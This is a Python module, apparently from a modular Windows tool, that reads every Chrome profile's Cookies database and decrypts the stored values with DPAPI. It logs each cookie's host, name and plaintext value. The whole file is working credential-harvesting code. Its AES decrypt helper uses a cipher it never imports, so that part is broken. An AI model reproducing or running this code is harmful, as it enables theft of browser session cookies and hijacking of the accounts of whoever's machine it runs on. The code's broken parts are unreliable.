# coding: utf-8

try:
	import os
	import sqlite3
	import win32crypt
except ImportError:
	pass

from modules.windows.chrome.chrome_module import ChromeModule


class WindowsChromeCookie(ChromeModule):
	def __init__(self):
		ChromeModule.__init__(
			self,
			name='WindowsChromeCookie',
			version='0.1.0',
			file=__file__,
			dependencies=['os', 'sqlite3', 'win32crypt'],
		)

	def execute(self) -> bool:
		if not super().execute():
			return False

		for profile in self.get_profiles():
			cookie_path = profile + '\\Cookies'
			if os.path.isfile(cookie_path):
				connection = sqlite3.connect(cookie_path)
				cursor = connection.cursor()
				try:
					cursor.execute('SELECT host_key, name, encrypted_value FROM cookies')
				except sqlite3.OperationalError:
					self.executenot(cookie_path + ' database is locked', 1)
					return False

				self.log('url,name,value')
				for host_key, name, encrypted_value in cursor.fetchall():
					self.log(host_key + ',' + name + ',' + (win32crypt.CryptUnprotectData(encrypted_value, None, None, None, 0)[1]).decode('utf-8'))

		return True

	# https://github.com/n8henrie/pycookiecheat/blob/master/src/pycookiecheat/pycookiecheat.py
	def clean(self, decrypted: bytes) -> str:
		r"""Strip padding from decrypted value.
		Remove number indicated by padding
		e.g. if last is '\x0e' then ord('\x0e') == 14, so take off 14.
		Args:
			decrypted: decrypted value
		Returns:
			Decrypted stripped of junk padding
		"""
		try:
			last = decrypted[-1]
			if isinstance(last, int):
				return decrypted[:-last].decode('utf8')
			return decrypted[:-ord(last)].decode('utf8')
		except IndexError:
			return 'Uncrackable'

	def decrypt(self, encrypted_value: bytes, key: bytes) -> str:
		"""Decrypt Chrome/Chromium's encrypted cookies.
		Args:
			encrypted_value: Encrypted cookie from Chrome/Chromium's cookie file
			key: Key to decrypt encrypted_value
		Returns:
			Decrypted value of encrypted_value
		"""
		# Encrypted cookies should be prefixed with 'v10' or 'v11' according to the
		# Chromium code. Strip it off.
		try:
			encrypted_value = encrypted_value[3:]

			cipher = AES.new(key, AES.MODE_CBC, IV=b' ' * 16)
			decrypted = cipher.decrypt(encrypted_value)

			return self.clean(decrypted)
		except UnicodeDecodeError:
			return 'Uncrackable'
